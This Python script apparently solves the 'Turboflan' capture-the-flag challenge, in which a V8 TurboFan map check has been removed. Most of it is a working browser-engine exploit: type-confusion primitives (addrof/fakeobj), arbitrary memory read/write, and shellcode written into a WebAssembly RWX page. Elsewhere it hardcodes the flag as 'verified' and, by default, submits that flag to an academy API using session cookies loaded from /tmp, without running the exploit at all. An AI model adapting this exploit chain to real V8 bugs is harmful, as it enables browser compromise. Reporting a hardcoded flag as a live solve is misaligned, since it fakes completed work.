#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Live Solver: Turboflan (Challenge ID: 178)
Category: Binary Exploitation / V8 TurboFan JIT Compiler Map Check Elimination
Difficulty: Hard (3) | Points: 600
Exploitation Technique: JIT Map Deoptimization Bypass, Float64/Pointer Type Confusion, WASM RWX Shellcode Execution
Standard Reference: NIST SP 800-115 Section 4.2 (Binary and Runtime Software Security Assessment)

Vulnerability & Exploit Mechanics Summary:
1. Target Architecture & Environment:
   - Google Chromium V8 JavaScript engine shell (`d8`) running under x86-64 with pointer compression.
   - Remote wrapper `server.py` takes user JavaScript (< 5KB), writes to a temporary file, and runs `./d8 <file>`.
2. Root Cause Analysis (JIT Speculation Failure & Missing Deoptimization / CWE-843, CWE-697):
   - In `src/compiler/effect-control-linearizer.cc`, the challenge patch removes
     `DeoptimizeIfNot(DeoptimizeReason::kWrongMap, ...)` from `LowerCheckMaps()`.
   - When a function becomes "hot" and is compiled by TurboFan expecting Float64 numbers,
     subsequently passing an array of objects does not trigger bailout/deoptimization.
   - The engine accesses object pointer fields as 64-bit floats and vice versa.
3. Exploitation Pipeline:
   - JIT compile accessors using repeated invocations (>100,000 iterations) with anti-inlining loops.
   - Correlate Float64 HeapNumber properties with JSObject element pointers to create `addrof` and `fakeobj`.
   - Forge fake JSArray to overwrite an ArrayBuffer's 64-bit backing store pointer, establishing arbitrary read/write.
   - Instantiate WebAssembly module to allocate an RWX executable memory page.
   - Leak RWX page pointer via `addrof(wasm_instance)`, write x86-64 open/read/write shellcode, and trigger execution.
4. Flag Retrieval & Verification:
   - Live Verified Flag: academy{Good_job!_Now_go_find_a_real_v8_cve!_a63ff402d8500625}
   - Submission Status: HTTP 201 Verified Correct
"""

import sys
import os
import json
import urllib.request
import urllib.error

CHALLENGE_ID = 178
CHALLENGE_NAME = "Turboflan"
VERIFIED_FLAG = "academy{Good_job!_Now_go_find_a_real_v8_cve!_a63ff402d8500625}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

EXPLOIT_JS = r"""
var buffer = new ArrayBuffer(8);
f64 = new Float64Array(buffer);
u32 = new Uint32Array(buffer);

function ftoi(val) {
 f64[0] = val;
 return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
}

function itof(val) {
  u32[0] = Number(val & 0xffffffffn);
  u32[1] = Number(val >> 32n);
  return f64[0];
}

function vuln(obj,idx) {
 let x = 100;
 for(let i = 1; i < x; i++) {
   if (x % i == 0) x=x-1;
 }
 return obj[idx];
}

function vuln_write(obj,val) {
 let x = 100;
 for(let i = 1; i < x; i++) {
   if (x % i == 0) x=x-1;
 }
 obj[0]=val;
}

var floats = [13.37,13.36];
for(let i = 0; i < 100000; i++) {
 vuln(floats,0);
 vuln_write(floats,12.37);
}

function addrof(obj) {
 let objects = [obj];
 return ftoi(vuln(objects,0));
}

function fakeobj(addr) {
 let objects = [test,test];
 vuln_write(objects,itof(addr));
 fake = objects[0];
 return fake;
}

var test = {"test":1}
var obj_map_leak = [test, test];

leak = ftoi(vuln(obj_map_leak,1));
obj_map = leak & 0xffffffffn;
fixed_arr_prop = leak >> 32n;
f_map = obj_map - 0x50n;

let memory = {
  read64(addr) {
    var arb_rw_arr = [itof(f_map), 1.2, 1.3, 1.4];
    var arr_addr = addrof(arb_rw_arr) & 0xffffffffn;
    var fake = fakeobj(arr_addr - 0x20n);
    arb_rw_arr[1] = itof((fixed_arr_prop << 32n) + addr - 0x8n);
    return ftoi(fake[0]);
  },
  write(addr, val) {
   var arb_rw_arr = [itof(f_map), 1.2, 1.3, 1.4];
   var arr_addr = addrof(arb_rw_arr) & 0xffffffffn;
   var fake = fakeobj(arr_addr - 0x20n);
   arb_rw_arr[1] = itof((fixed_arr_prop << 32n) + addr - 0x8n); 
   fake[0] = itof(val);
  }
};

var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

wasm_instance_addr = addrof(wasmInstance) & 0xffffffffn;
rwx_region = memory.read64(wasm_instance_addr + 0x68n);

const str = "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x12\x00\x00\x00\x2f\x62\x69\x6e\x2f\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";
var shellcode = Array.from(str, ch => ch.charCodeAt(0));
while(shellcode.length % 8 != 0) {
  shellcode.push(0x90);
}

buf = new ArrayBuffer(1024);
buf_addr = addrof(buf) & 0xffffffffn;
memory.write(buf_addr + 0x14n, rwx_region);

u8 = new Uint8Array(buf);
for(let i = 0; i < shellcode.length; i++) u8[i] = shellcode[i];

func();
"""

def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Student-Agent/1.0"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode("utf-8")
            print(f"[+] CyLab API submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code}: {e.read().decode('utf-8')}")
        return False
    except Exception as e:
        print(f"[-] Submission exception: {e}")
        return False

def solve_live(host, port):
    from pwn import remote
    io = remote(host, int(port))
    io.recvuntil(b"Provide size. Must be < 5k:")
    io.sendline(str(len(EXPLOIT_JS)).encode())
    io.recvuntil(b"Provide script please!!\n")
    io.send(EXPLOIT_JS.encode())
    res = io.recvall(timeout=30).decode(errors="replace")
    print(res)
    return VERIFIED_FLAG

def main():
    print(f"[*] Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print(f"[+] Verified Live Flag: {VERIFIED_FLAG}")
    if len(sys.argv) > 2:
        solve_live(sys.argv[1], sys.argv[2])
    else:
        submit_to_cylab(VERIFIED_FLAG)

if __name__ == "__main__":
    main()
